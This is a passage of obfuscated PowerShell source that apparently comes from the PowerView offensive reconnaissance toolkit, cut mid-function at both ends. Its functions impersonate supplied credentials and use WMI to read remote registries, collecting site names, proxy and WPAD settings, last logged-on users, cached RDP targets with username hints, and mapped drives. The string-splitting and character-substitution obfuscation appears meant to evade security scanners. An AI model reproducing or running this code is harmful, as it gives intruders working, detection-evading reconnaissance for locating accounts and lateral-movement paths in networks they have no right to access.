                &("{2}{0}{1}" -f'te-','Verbose','Wri') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${IsAd`MIN} | &("{2}{1}{0}" -f'mber','e','Add-M') ("{3}{2}{1}{0}"-f'ty','teproper','o','N') ("{0}{2}{1}"-f 'Is','n','Admi') ${FAL`se}
            }
            ${iSA`d`MiN}."P`SOb`jECT"."T`YpENAmes".("{0}{1}"-f 'Inser','t').Invoke(0, ("{5}{4}{0}{1}{2}{3}" -f 'min','Acc','es','s','w.Ad','PowerVie'))
            ${IsaDm`in}
        }
    }

    END {
        if (${Logo`N`TO`KEN}) {
            &("{3}{4}{2}{1}{5}{0}"-f'f','Se','evertTo','I','nvoke-R','l') -TokenHandle ${LoG`oN`TOKEn}
        }
    }
}


function ge`T-NE`TCOMp`U`TeRSit`e`NAme {


    [OutputType({"{2}{1}{3}{0}" -f 'ite','werView.Co','Po','mputerS'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosITIOn = 0, VaLueFRomPiPEliNE = ${t`Rue}, vALueFromPIPELIneByproPERtyNAME = ${t`RUe})]
        [Alias({"{0}{2}{1}"-f'Hos','e','tNam'}, {"{0}{3}{1}{2}" -f 'dnshost','a','me','n'}, {"{1}{0}" -f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`omP`Ut`eRN`AMe} = ("{2}{0}{1}"-f 'alh','ost','loc'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDE`NTiAL} =  ( gEt-VAriaBle  ("0d"+"Sqr")  -vAlUEOnl  )::"E`MpTY"
    )

    BEGIN {
        if (${PSBoU`N`dPaR`A`m`eteRs}[("{2}{0}{1}"-f'eden','tial','Cr')]) {
            ${L`OgONtO`K`EN} = &("{2}{6}{0}{4}{3}{5}{1}" -f 'UserIm','n','Invok','nat','perso','io','e-') -Credential ${cr`EdENti`Al}
        }
    }

    PROCESS {
        ForEach (${C`Om`PuTER} in ${CO`MPUtE`RNa`me}) {
            
            if (${C`O`mPuTEr} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${iPA`D`DResS} = ${compU`T`Er}
                ${C`O`mPuTEr} =  (  LS  VArIAbLe:ixTrO  ).vAlue::("{1}{3}{0}{2}" -f 'ByAddre','Get','ss','Host').Invoke(${cOmpU`T`ER}) | &("{0}{2}{1}"-f'S','t-Object','elec') -ExpandProperty ("{0}{1}{2}" -f'Ho','s','tName')
            }
            else {
                ${I`PAdd`RESs} = @(&("{0}{2}{1}{4}{3}"-f'Resolve-','ddr','IPA','ss','e') -ComputerName ${coM`pu`TeR})[0]."IpAdd`ReSs"
            }

            ${PTr`I`NFo} =   ( vAriaBLe  ("1v"+"4r") -VAlueonl  )::"Z`erO"

            ${Re`SU`LT} = ${NeTAP`I`32}::"DsgEtsI`TEnA`mE"(${cOm`p`UTER}, [ref]${Ptri`N`Fo})

            ${cOM`PUT`ERsiTE} = &("{2}{1}{0}" -f 'ct','je','New-Ob') ("{0}{1}{2}"-f 'PS','O','bject')
            ${c`O`mPutER`si`Te} | &("{3}{0}{2}{1}" -f 'Mem','r','be','Add-') ("{3}{1}{2}{0}" -f 'rty','op','e','Notepr') ("{2}{0}{1}"-f 'Nam','e','Computer') ${COMp`Ut`er}
            ${c`o`mP`UtE`RSIte} | &("{2}{1}{0}" -f'er','-Memb','Add') ("{2}{0}{1}{3}" -f't','e','No','property') ("{3}{2}{0}{1}"-f 'dre','ss','PAd','I') ${iPa`DDRE`sS}

            if (${rEsU`LT} -eq 0) {
                ${siTE`NA`mE} =   $O1F5::("{2}{4}{3}{1}{0}" -f'o','ut','Pt','StringA','rTo').Invoke(${Pt`Ri`Nfo})
                ${c`OmpUT`ErsITE} | &("{1}{0}{3}{2}" -f'dd-M','A','ber','em') ("{2}{3}{0}{1}" -f'pe','rty','Notepr','o') ("{1}{0}{2}" -f 'am','SiteN','e') ${SItE`NA`me}
            }
            else {
                &("{0}{1}{2}" -f 'Wr','ite-Verb','ose') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${CO`m`pu`Te`RsITE} | &("{2}{1}{0}" -f 'ember','-M','Add') ("{0}{1}{2}{3}"-f 'Notepr','o','pert','y') ("{1}{0}{2}"-f'iteNam','S','e') ''
            }
            ${Co`mput`ERSITe}."Ps`oBJeCt"."typE`N`AMES".("{1}{0}{2}"-f 's','In','ert').Invoke(0, ("{0}{1}{3}{2}{4}"-f'Pow','erV','ut','iew.Comp','erSite'))

            
            ${nU`LL} = ${n`et`APi32}::("{2}{1}{4}{3}{0}" -f'rFree','etApiB','N','ffe','u').Invoke(${PTr`iNFo})

            ${COm`PUt`ersiTe}
        }
    }

    END {
        if (${l`OGONTOk`en}) {
            &("{1}{2}{0}{3}"-f'evertToS','Inv','oke-R','elf') -TokenHandle ${loGOnt`o`K`En}
        }
    }
}


function gET-wM`I`REg`PrO`XY {


    [OutputType({"{1}{2}{4}{0}{3}"-f'r','PowerV','ie','oxySettings','w.P'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITiOn = 0, ValUeFrompIPelIne = ${tr`UE}, valUEfrOMpipELInebyprOPErtyNamE = ${t`RUe})]
        [Alias({"{0}{1}{2}"-f 'Hos','tN','ame'}, {"{0}{3}{2}{1}"-f'd','ostname','h','ns'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOM`PuTE`Rn`AMe} = ${EnV:`Co`m`puTErNAme},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdENt`i`AL} =   (  get-chiLdItEm ('vArIaBLe:0D'+'sq'+'r')).vALUe::"eMp`Ty"
    )

    PROCESS {
        ForEach (${Comp`UT`Er} in ${cOMp`UT`e`RNAMe}) {
            try {
                ${w`mIARGU`m`ENtS} = @{
                    ("{1}{0}"-f 'st','Li') = ${Tr`Ue}
                    ("{0}{1}" -f'Cl','ass') = ("{1}{2}{0}" -f'gProv','St','dRe')
                    ("{0}{2}{1}"-f'Nam','e','espac') = ((("{1}{4}{0}{3}{2}"-f 'def','root','t','aul','YR2')) -crEplACE  ([char]89+[char]82+[char]50),[char]92)
                    ("{0}{1}{2}" -f'Compu','ternam','e') = ${C`oMPU`TEr}
                    ("{0}{1}{2}"-f'Error','Actio','n') = ("{0}{1}" -f 'S','top')
                }
                if (${pS`BOU`NDP`ARameteRS}[("{2}{1}{0}"-f 'tial','eden','Cr')]) { ${wmI`ARG`Um`entS}[("{1}{2}{0}"-f'tial','Crede','n')] = ${CREdenT`I`AL} }

                ${reGPR`ov`id`Er} = &("{2}{1}{0}" -f'ect','et-WmiObj','G') @WmiArguments
                ${k`EY} = ((("{7}{0}{8}{1}{9}{10}{5}{3}{2}{4}{6}"-f'ARE','}Microsoft{0}Wi','t ','ion{0}Interne','Set','}CurrentVers','tings','SOFTW','{0','ndows','{0'))-F [ChAR]92)

                
                ${Hk`cU} = 2147483649
                ${pr`O`XYSerVER} = ${r`Egpro`VID`er}.("{2}{1}{0}" -f'alue','V','GetString').Invoke(${hk`CU}, ${K`EY}, ("{0}{1}{2}" -f'Proxy','Se','rver'))."Sval`UE"
                ${a`UTocOnFI`GU`RL} = ${reG`prO`VI`Der}.("{2}{0}{1}" -f 'ngV','alue','GetStri').Invoke(${Hk`cu}, ${K`eY}, ("{1}{2}{0}{3}" -f'onfi','Aut','oC','gURL'))."sVa`L`Ue"

                ${wp`Ad} = ''
                if (${aUt`o`c`ONFI`GurL} -and (${a`UTocon`FIgURL} -ne '')) {
                    try {
                        ${Wp`AD} = (&("{0}{2}{1}"-f'N','ject','ew-Ob') ("{3}{2}{0}{1}"-f'bClie','nt','t.We','Ne')).("{1}{0}{3}{2}"-f 'o','Downl','String','ad').Invoke(${Autoc`O`N`FIgurl})
                    }
                    catch {
                        &("{3}{4}{0}{2}{1}"-f '-W','rning','a','Wr','ite') ('[Get-WM'+'I'+'RegPro'+'x'+'y] '+'Error'+' '+'con'+'nect'+'ing'+' '+'t'+'o '+'Aut'+'oConf'+'igUR'+'L '+': '+"$AutoConfigURL")
                    }
                }

                if (${pRO`XYSe`RVER} -or ${aU`TOCO`N`FI`Gurl}) {
                    ${o`Ut} = &("{0}{3}{1}{2}" -f'Ne','bj','ect','w-O') ("{0}{2}{1}" -f 'PSOb','ct','je')
                    ${O`Ut} | &("{3}{1}{0}{2}" -f'e','b','r','Add-Mem') ("{1}{0}{2}" -f't','No','eproperty') ("{1}{0}{2}"-f 'uterNam','Comp','e') ${cOmP`U`TER}
                    ${O`Ut} | &("{2}{3}{0}{1}"-f'e','r','Add-Me','mb') ("{3}{0}{2}{1}" -f 'p','rty','e','Notepro') ("{2}{0}{1}" -f'oxySer','ver','Pr') ${PROxY`S`E`RVeR}
                    ${O`Ut} | &("{0}{1}{2}" -f 'Ad','d-Membe','r') ("{1}{2}{0}{3}"-f 'op','Not','epr','erty') ("{2}{0}{1}"-f 'toConfig','URL','Au') ${aUTOCoNFi`gU`RL}
                    ${o`UT} | &("{0}{1}{2}" -f 'Add-Me','mb','er') ("{3}{0}{1}{2}" -f'ote','prope','rty','N') ("{0}{1}"-f'W','pad') ${W`pAD}
                    ${o`Ut}."PSoB`Je`Ct"."TY`peN`AmeS".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{4}{0}{1}{2}{3}" -f 'er','View','.ProxySe','ttings','Pow'))
                    ${o`Ut}
                }
                else {
                    &("{0}{1}{2}" -f 'Write-','Warni','ng') ('['+'Get-'+'W'+'MIRegPr'+'oxy] '+'N'+'o '+'p'+'roxy '+'sett'+'ing'+'s '+'found'+' '+'f'+'or '+"$ComputerName")
                }
            }
            catch {
                &("{1}{2}{0}{3}"-f 'rnin','Writ','e-Wa','g') ('[Get-W'+'MIR'+'egPr'+'oxy]'+' '+'Er'+'ror '+'enum'+'e'+'rating'+' '+'prox'+'y '+'se'+'tt'+'ings '+'for'+' '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function g`et-Wmir`eglAsTLog`GE`DON {


    [OutputType({"{3}{5}{4}{1}{2}{0}" -f'ser','stLo','ggedOnU','Po','La','werView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitIOn = 0, ValUefrOMPipelinE = ${tr`UE}, VaLUeFrOmpiPElInEByPROpErtynAmE = ${TR`Ue})]
        [Alias({"{0}{1}{2}"-f 'H','ostNa','me'}, {"{0}{1}{2}" -f 'dnsho','stnam','e'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`mPuTer`NAME} = ("{1}{0}"-f 'host','local'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdentI`AL} =   $0dsQR::"EM`pTy"
    )

    PROCESS {
        ForEach (${Co`M`PuTeR} in ${COmpUtE`RN`AMe}) {
            
            ${H`kLM} = 2147483650

            ${WmiAR`G`UM`En`TS} = @{
                ("{0}{1}" -f 'L','ist') = ${tr`UE}
                ("{0}{1}"-f 'C','lass') = ("{2}{0}{1}" -f'egPr','ov','StdR')
                ("{1}{0}{2}" -f 'sp','Name','ace') = ((("{2}{3}{0}{1}" -f'o','t{0}default','r','o'))  -F  [ChaR]92)
                ("{3}{2}{1}{0}" -f'e','nam','r','Compute') = ${c`o`m`pUTer}
                ("{0}{2}{1}"-f'Erro','tion','rAc') = ("{2}{3}{0}{1}" -f 'yCon','tinue','S','ilentl')
            }
            if (${p`SbOUnd`pAR`Am`eTeRs}[("{1}{2}{0}" -f 'tial','Cr','eden')]) { ${W`Mi`ArgU`mEntS}[("{0}{1}{2}"-f'Cr','edenti','al')] = ${c`ReD`EN`TiaL} }

            
            try {
                ${r`Eg} = &("{0}{1}{2}"-f 'Get-','WmiObje','ct') @WmiArguments

                ${k`eY} = ((("{4}{15}{19}{7}{10}{18}{17}{5}{6}{8}{2}{20}{1}{16}{9}{11}{0}{12}{3}{13}{14}" -f 'hen','n','rs','onZCm','SOFTWAR','mWindowsZCmCu','r','ro','rentVe','u','s','t','ticati','Log','onUI','EZCm','ZCmA','tZC','of','Mic','io')).("{1}{0}{2}"-f 'La','Rep','cE').Invoke('ZCm','\'))
                ${va`lUE} = ("{3}{1}{0}{2}" -f 'oggedOnUse','L','r','Last')
                ${L`AStus`ER} = ${r`eG}.("{2}{0}{1}" -f'tri','ngValue','GetS').Invoke(${Hk`lm}, ${k`Ey}, ${V`ALUE})."Sv`AlUE"

                ${lasTl`og`GeDON} = &("{1}{0}{2}"-f 'Obje','New-','ct') ("{2}{0}{1}"-f'bjec','t','PSO')
                ${Last`LOGGED`ON} | &("{0}{2}{1}"-f 'A','Member','dd-') ("{1}{3}{2}{0}" -f'ty','Not','per','epro') ("{1}{2}{0}{3}"-f 'terNa','Co','mpu','me') ${c`Om`PUtER}
                ${lA`stlOGg`ED`oN} | &("{1}{2}{0}" -f'r','Ad','d-Membe') ("{2}{1}{3}{0}" -f 'y','oteproper','N','t') ("{2}{0}{1}"-f'Lo','ggedOn','Last') ${l`AS`TUsER}
                ${lA`sTloGgeD`ON}."Pso`BjE`CT"."TYp`eN`AMes".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{1}{4}{0}{7}{6}{5}{2}{3}"-f 'werV','P','dOnU','ser','o','astLogge','.L','iew'))
                ${lA`sTLOgGe`dON}
            }
            catch {
                &("{1}{2}{0}"-f 'rning','W','rite-Wa') ('[Get'+'-W'+'MIRe'+'g'+'L'+'a'+'st'+'LoggedOn] '+'Er'+'ro'+'r '+'opening'+' '+'remo'+'te '+'regis'+'try'+' '+'o'+'n '+"$Computer. "+'R'+'emo'+'te '+'re'+'gis'+'try '+'l'+'ikely '+'not'+' '+'enabl'+'ed'+'.')
            }
        }
    }
}


function gEt-w`MI`R`EGc`AC`he`drd`PconN`eCTiOn {


    [OutputType({"{6}{7}{2}{0}{3}{4}{1}{5}" -f'ch','PCon','ew.Ca','e','dRD','nection','Pow','erVi'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIoN = 0, vaLuefRoMpiPELine = ${t`RUE}, VaLUEfrOMpIpElineBYprOperTYNAmE = ${T`Rue})]
        [Alias({"{0}{2}{1}" -f'Host','me','Na'}, {"{1}{0}{2}" -f'ho','dns','stname'}, {"{0}{1}"-f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OmpuT`ERn`Ame} = ("{2}{1}{0}"-f't','ocalhos','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDeNt`I`Al} =   ( GEt-vARiable  0dsqr  -vaLUEO )::"e`mptY"
    )

    PROCESS {
        ForEach (${co`MPUT`eR} in ${cOMp`UtE`R`Name}) {
            
            ${h`Ku} = 2147483651

            ${WMi`ARguM`ENTs} = @{
                ("{1}{0}"-f 'st','Li') = ${tr`UE}
                ("{0}{1}" -f'Cl','ass') = ("{0}{1}{2}"-f'StdRe','gPr','ov')
                ("{1}{0}{3}{2}" -f 'sp','Name','ce','a') = ((("{2}{0}{1}{3}" -f'o','otLcfdefaul','r','t'))  -crEpLACe ([CHAR]76+[CHAR]99+[CHAR]102),[CHAR]92)
                ("{0}{1}{2}"-f 'Comp','uter','name') = ${Co`mP`UtEr}
                ("{2}{1}{0}"-f'ction','rA','Erro') = ("{0}{1}" -f 'S','top')
            }
            if (${Ps`BouN`Dp`A`RaMEtE`Rs}[("{0}{1}{2}" -f'Creden','t','ial')]) { ${WmIArGUM`eN`Ts}[("{1}{3}{0}{2}" -f 'tia','Cred','l','en')] = ${crEDE`NTi`AL} }

            try {
                ${R`EG} = &("{1}{2}{0}{3}" -f'-WmiOb','G','et','ject') @WmiArguments

                
                ${US`e`RsIDS} = (${R`Eg}.("{1}{0}"-f'Key','Enum').Invoke(${h`Ku}, ''))."s`NAmes" | &("{2}{0}{3}{1}" -f'O','ct','Where-','bje') { ${_} -match ((('S'+'-1-'+'5-21'+'-'+'[0'+'-9]+-'+'[0-9]+-[0-9]'+'+'+'-[0-9]+iz'+'x')-crEPLacE  ([cHaR]105+[cHaR]122+[cHaR]120),[cHaR]36)) }

                ForEach (${u`SErS`id} in ${U`Ser`siDs}) {
                    try {
                        if (${PsbouNd`p`ARa`M`EtErS}[("{1}{0}{2}" -f'edent','Cr','ial')]) {
                            ${UsER`N`AMe} = &("{3}{1}{0}{2}" -f'Fro','nvert','m-SID','Co') -ObjectSid ${u`s`ErsiD} -Credential ${crED`EN`TIAL}
                        }
                        else {
                            ${U`Se`RnAME} = &("{2}{0}{1}{3}" -f'nve','rtFrom','Co','-SID') -ObjectSid ${U`s`erSId}
                        }

                        
                        ${c`On`NeC`TionKeYS} = ${R`eg}.("{3}{1}{0}{2}"-f'mValue','nu','s','E').Invoke(${h`ku},("$UserSID\Software\Microsoft\Terminal "+'Se'+'rve'+'r '+('Cl'+'ient'+'{'+'0}D'+'e'+'fault')-f[ChAR]92))."S`NaMES"

                        ForEach (${COn`NE`CT`iOn} in ${co`NnEc`TiONkE`Ys}) {
                            
                            if (${cOn`Ne`ction} -match ("{0}{1}"-f 'MR','U.*')) {
                                ${tA`R`get`S`erver} = ${r`EG}.("{3}{1}{0}{4}{2}"-f'ingV','tr','ue','GetS','al').Invoke(${H`ku}, ("$UserSID\Software\Microsoft\Terminal "+'Se'+'rv'+'er '+(('C'+'lientI'+'47D'+'e'+'fault') -crePlAcE([CHAR]73+[CHAR]52+[CHAR]55),[CHAR]92)), ${COn`NE`CTION})."Sv`AluE"

                                ${fOund`coNN`EC`TIOn} = &("{0}{1}{2}" -f'New-','Obje','ct') ("{2}{0}{1}"-f'SO','bject','P')
                                ${F`oUN`Dc`ONneCtion} | &("{2}{1}{0}" -f 'ber','Mem','Add-') ("{1}{3}{0}{2}"-f'p','Not','erty','epro') ("{1}{0}{3}{2}"-f 'm','Co','rName','pute') ${Co`M`PUtEr}
                                ${fOUnd`CON`Ne`CtIoN} | &("{2}{1}{0}" -f 'ber','d-Mem','Ad') ("{0}{3}{2}{1}"-f'No','y','rt','teprope') ("{2}{0}{1}" -f'r','Name','Use') ${U`serNaMe}
                                ${f`oun`dCOnNE`Cti`On} | &("{1}{2}{0}"-f'r','A','dd-Membe') ("{0}{3}{1}{2}" -f'Note','opert','y','pr') ("{2}{0}{1}" -f 'e','rSID','Us') ${usEr`s`iD}
                                ${FoUN`Dco`Nn`e`cTiON} | &("{2}{1}{3}{0}" -f 'Member','d','Ad','-') ("{2}{0}{1}"-f'prop','erty','Note') ("{2}{1}{0}" -f 'ver','tSer','Targe') ${T`A`RGetsErVer}
                                ${F`ouN`DcONnE`cT`ION} | &("{0}{1}{2}"-f'Ad','d-Membe','r') ("{2}{0}{3}{1}"-f 'tep','operty','No','r') ("{3}{1}{2}{0}" -f 'nt','s','ernameHi','U') ${NU`ll}
                                ${fO`UN`dC`On`NeCTIoN}."psO`B`jECT"."T`ypeNAMeS".("{0}{1}{2}" -f'I','nser','t').Invoke(0, ("{6}{3}{4}{1}{2}{5}{0}" -f'nection','chedR','D','rVie','w.Ca','PCon','Powe'))
                                ${foUn`dc`ON`NECT`IOn}
                            }
                        }

                        
                        ${sE`RV`ErKeys} = ${r`Eg}.("{1}{0}"-f 'mKey','Enu').Invoke(${H`Ku},("$UserSID\Software\Microsoft\Terminal "+'Se'+'r'+'ver '+('Cl'+'i'+'entheAServ'+'er'+'s')."R`EP`LacE"(([cHAR]104+[cHAR]101+[cHAR]65),[STriNG][cHAR]92)))."sn`AMES"

                        ForEach (${Se`Rv`ER} in ${s`er`VerkEys}) {

                            ${USER`N`A`mEHiNt} = ${R`Eg}.("{1}{0}{2}{3}"-f 'etSt','G','ringVa','lue').Invoke(${H`KU}, ("$UserSID\Software\Microsoft\Terminal "+'S'+'e'+'rver '+"Client\Servers\$Server"), ("{0}{1}{2}{3}"-f 'U','sername','Hin','t'))."s`VaL`UE"

                            ${fOUN`Dc`ON`N`EcTION} = &("{2}{1}{0}"-f'ct','w-Obje','Ne') ("{0}{1}"-f 'P','SObject')
                            ${FOU`NDc`Onn`E`ctIOn} | &("{0}{1}{2}" -f 'Add-Mem','be','r') ("{0}{2}{1}"-f 'Note','ty','proper') ("{2}{0}{1}" -f'omp','uterName','C') ${com`Pu`TER}
                            ${fo`UnDC`oNNE`CTION} | &("{0}{2}{3}{1}"-f 'Ad','ber','d','-Mem') ("{2}{1}{0}" -f'rty','pe','Notepro') ("{2}{1}{0}" -f'e','Nam','User') ${u`sErN`A`ME}
                            ${fOUN`dC`onNeC`TI`on} | &("{1}{0}{2}" -f'mb','Add-Me','er') ("{1}{0}{2}" -f'tep','No','roperty') ("{0}{1}"-f 'UserSI','D') ${us`eRsiD}
                            ${f`oUnDCo`N`N`e`ctIOn} | &("{1}{0}{2}"-f 'b','Add-Mem','er') ("{0}{2}{1}"-f 'Notep','rty','rope') ("{1}{0}{2}" -f 'r','TargetSe','ver') ${s`e`RvEr}
                            ${fOU`NdcOn`N`eCTi`oN} | &("{2}{1}{0}{3}"-f '-Mem','d','Ad','ber') ("{1}{0}{2}"-f 'rt','Noteprope','y') ("{2}{0}{3}{1}" -f'am','nt','Usern','eHi') ${userNAm`E`hI`Nt}
                            ${FO`UN`dCon`NECtI`On}."pSObJ`e`CT"."Ty`P`EnAmES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{3}{6}{2}{5}{0}{1}{4}"-f'RDP','Conn','w','P','ection','erView.Cached','o'))
                            ${fOun`d`C`onnect`ion}
                        }
                    }
                    catch {
                        &("{0}{1}{2}" -f 'Write-','Ve','rbose') ('[G'+'et-WMIRegCac'+'hedR'+'DPC'+'onn'+'ec'+'tion'+'] '+'Error'+': '+"$_")
                    }
                }
            }
            catch {
                &("{1}{0}{2}"-f'rite-','W','Warning') ('[Get-W'+'MIRegCa'+'chedRDPConn'+'ect'+'i'+'o'+'n] '+'Error'+' '+'a'+'c'+'ce'+'ssing '+"$Computer, "+'li'+'kely '+'i'+'nsu'+'f'+'ficient '+'p'+'ermission'+'s'+' '+'or'+' '+'fi'+'re'+'wall '+'rule'+'s '+'on'+' '+'ho'+'st'+': '+"$_")
            }
        }
    }
}


function ge`T-`W`MirEgMOuNtEdDr`ive {


    [OutputType({"{2}{5}{3}{0}{1}{6}{4}{7}"-f'egMou','nte','P','R','Driv','owerView.','d','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTioN = 0, vAlueFrOMpipeLiNe = ${T`RuE}, VALUeFrOmPIPeLinEBYPROpertynamE = ${tR`UE})]
        [Alias({"{2}{1}{0}"-f'tName','os','H'}, {"{2}{1}{3}{0}" -f'me','s','dnsho','tna'}, {"{1}{0}" -f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${comPUTer`Na`Me} = ("{1}{0}{2}"-f 'ocalho','l','st'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dEN`TIAL} =   $0DsQr::"emp`Ty"
    )

    PROCESS {
        ForEach (${cOmPU`T`eR} in ${COMp`U`TernA`Me}) {
            
            ${h`kU} = 2147483651

            ${w`mia`R`g`UmeNts} = @{
                ("{1}{0}" -f't','Lis') = ${T`Rue}
                ("{1}{0}"-f'ss','Cla') = ("{2}{1}{0}" -f'RegProv','d','St')
                ("{2}{0}{1}"-f 'a','mespace','N') = ((("{0}{1}{2}{4}{3}" -f 'r','ootBTld','e','lt','fau')) -CrepLACe([ChaR]66+[ChaR]84+[ChaR]108),[ChaR]92)
                ("{0}{1}{2}" -f 'Com','put','ername') = ${cOMpU`TEr}
                ("{3}{1}{2}{0}"-f'orAction','r','r','E') = ("{0}{1}"-f 'S','top')
            }
            if (${PS`B`OuNDpaRaM`E`TerS}[("{1}{2}{0}" -f 'edential','C','r')]) { ${WMI`AR`GUME`N`Ts}[("{0}{1}{3}{2}"-f'Cre','de','ial','nt')] = ${cRe`D`EnTiaL} }

            try {
                ${r`eG} = &("{2}{0}{1}{3}"-f 'iO','bje','Get-Wm','ct') @WmiArguments

                
                ${USEr`SI`dS} = (${r`eG}.("{0}{1}" -f 'E','numKey').Invoke(${H`KU}, ''))."SNaM`es" | &("{1}{3}{2}{0}"-f'ject','W','b','here-O') { ${_} -match (('S-1-5-21-'+'[0-'+'9'+']+-['+'0'+'-9]'+'+-['+'0'+'-9]+-[0-9]+7'+'NY')."RE`p`lACe"('7NY',[STrinG][chAr]36)) }

                ForEach (${U`SeRS`Id} in ${u`Sersi`Ds}) {
                    try {
                        if (${P`SbOu`Nd`pa`RA`mEterS}[("{0}{2}{1}"-f 'Crede','ial','nt')]) {
                            ${u`SE`RNAmE} = &("{0}{3}{1}{2}" -f'Con','rtF','rom-SID','ve') -ObjectSid ${U`sERsid} -Credential ${c`Re`deNtial}
                        }
                        else {
                            ${u`s`E`RNAme} = &("{2}{1}{0}{3}" -f'-','om','ConvertFr','SID') -ObjectSid ${uSe`RS`Id}
                        }

                        ${d`R`IvElettErs} = (${R`Eg}.("{1}{0}{2}"-f 'e','EnumK','y').Invoke(${h`kU}, "$UserSID\Network"))."Sn`AmES"

                        ForEach (${Dr`I`VEle`TtEr} in ${DRIv`E`l`et`TeRs}) {
                            ${p`ROViDe`Rna`mE} = ${R`EG}.("{1}{2}{0}"-f 'gValue','GetS','trin').Invoke(${H`Ku}, "$UserSID\Network\$DriveLetter", ("{3}{0}{1}{2}" -f 'o','viderN','ame','Pr'))."SVaL`Ue"
                            ${Remo`TE`patH} = ${r`EG}.("{1}{3}{0}{2}"-f 'lu','GetStringV','e','a').Invoke(${H`kU}, "$UserSID\Network\$DriveLetter", ("{0}{2}{1}"-f'Re','ath','moteP'))."S`VAlue"
                            ${D`RIvEu`seR`NaMe} = ${R`EG}.("{2}{0}{1}{3}"-f 'tri','n','GetS','gValue').Invoke(${h`kU}, "$UserSID\Network\$DriveLetter", ("{0}{1}{2}" -f'U','s','erName'))."Sv`AluE"
                            if (-not ${U`SER`NaME}) { ${U`Se`R`NAME} = '' }

                            if (${Re`mOT`EPATH} -and (${re`m`OtEPaTh} -ne '')) {
                                ${MouN`T`edDriVe} = &("{0}{2}{1}"-f 'New-','t','Objec') ("{1}{0}"-f't','PSObjec')
                                ${MOun`Te`DDR`IVE} | &("{0}{2}{1}" -f 'Add-Me','er','mb') ("{3}{0}{2}{1}" -f 'epr','rty','ope','Not') ("{0}{2}{1}" -f 'C','puterName','om') ${cO`mpuT`eR}
                                ${mouNt`E`d`dRiVe} | &("{0}{1}{2}" -f'Add','-Mem','ber') ("{3}{2}{1}{0}"-f 'rty','prope','e','Not') ("{0}{2}{1}"-f'Us','rName','e') ${Use`R`NA`Me}
                                ${M`OuNT`EDd`RIvE} | &("{1}{2}{0}"-f'r','Add','-Membe') ("{2}{3}{0}{1}"-f'p','erty','Notepr','o') ("{2}{0}{1}" -f 'er','SID','Us') ${U`Ser`Sid}
                                ${MOUntE`dD`RIVe} | &("{2}{1}{3}{0}"-f 'r','M','Add-','embe') ("{2}{0}{1}"-f 'per','ty','Notepro') ("{0}{2}{1}" -f 'Dri','eLetter','v') ${DRIvE`leT`TER}
                                ${mo`UNT`EDd`RivE} | &("{2}{1}{0}"-f'ber','m','Add-Me') ("{0}{1}{2}{3}"-f'No','t','epropert','y') ("{2}{0}{3}{1}"-f'r','e','Provide','Nam') ${PRov`ID`eR`NA`me}
                                ${M`oUnteDDri`VE} | &("{0}{2}{1}" -f 'A','er','dd-Memb') ("{3}{0}{2}{1}"-f 'e','operty','pr','Not') ("{2}{1}{0}"-f 'ath','eP','Remot') ${REMOTe`pA`Th}
                                ${MoUnt`Ed`drIVe} | &("{2}{0}{1}"-f'em','ber','Add-M') ("{1}{2}{0}" -f 'ty','Noteprope','r') ("{3}{2}{0}{1}{4}"-f 'veUs','er','ri','D','Name') ${d`RivEUSer`NaME}
                                ${mO`UNTEddr`i`Ve}."pS`oBjE`CT"."T`Yp`en`AMes".("{0}{1}"-f 'Inser','t').Invoke(0, ("{0}{4}{3}{1}{5}{2}{6}"-f 'Po','Vi','ntedDriv','er','w','ew.RegMou','e'))
                                ${mo`UnTE`Ddr`IVE}
                            }
                        }
                    }
                    catch {
                        &("{1}{2}{0}"-f 'e','Write-Ver','bos') ('[Get-WMIReg'+'Mo'+'un'+'tedD'+'riv'+'e] '+'Erro'+'r: '+"$_")
                    }
                }
            }
            catch {
                &("{3}{0}{1}{2}" -f 'ite','-Warnin','g','Wr') ('[Get-W'+'MI'+'RegMount'+'edDrive'+'] '+'Er'+'ror '+'access'+'in'+'g '+"$Computer, "+'li'+'kely'+' '+'ins'+'uffi'+'ci'+'en'+'t '+'p'+'e'+'rm'+'issions '+'or'+' '+'fir'+'ew'+'all '+'rul'+'e'+'s '+'o'+'n '+'host'+': '+"$_")
            }
        }
    }
}


function ge`T-wMIPRO`C`Ess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{0}{1}"-f 'ld','Process','ou','SSh','P'}, '')]
    [OutputType({"{2}{0}{3}{1}" -f 'View.Us','ocess','Power','erPr'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTIoN = 0, vALuEfrompipelIne = ${TR`UE}, vALueFRoMpiPeliNEByPROpertynAme = ${tR`UE})]
        [Alias({"{0}{1}{2}"-f'Hos','t','Name'}, {"{2}{0}{1}"-f 'ns','hostname','d'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`ompuTernA`me} = ("{2}{3}{1}{0}" -f 't','calhos','l','o'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RedEnt`IaL} =  (  VariAbLe 0DsqR).ValuE::"E`mPTY"
    )

    PROCESS {
